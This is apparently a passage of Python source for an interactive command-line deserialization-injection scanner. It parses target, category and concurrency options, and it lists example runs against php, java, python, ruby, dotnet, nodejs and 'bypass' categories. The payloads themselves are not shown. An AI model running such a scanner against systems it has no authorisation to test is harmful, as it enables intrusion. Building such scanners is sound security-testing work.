        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )

    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Requisicoes simultaneas (default: 5)",
    )

    add_common_args(parser, "web")

    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan Deserialization a partir de argumentos parseados."""

    init_scanner(args)

    logger.info("Deserialization scan iniciado para %s", args.url)

    categories: list[str] = []

    if getattr(args, "category", None):
        categories = [args.category]

    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
            proxy=getattr(args, "proxy", None),
            json_output=getattr(args, "json_output", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""

    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="deserial> ",
        description="Deserialization Injection interativo.",
        example="https://target.com -c php",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c php\n"
            "  https://target.com -c java\n"
            "  https://target.com -c python\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080\n"
            "  https://target.com -c ruby\n"
            "  https://target.com -c dotnet\n"
            "  https://target.com -c nodejs"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
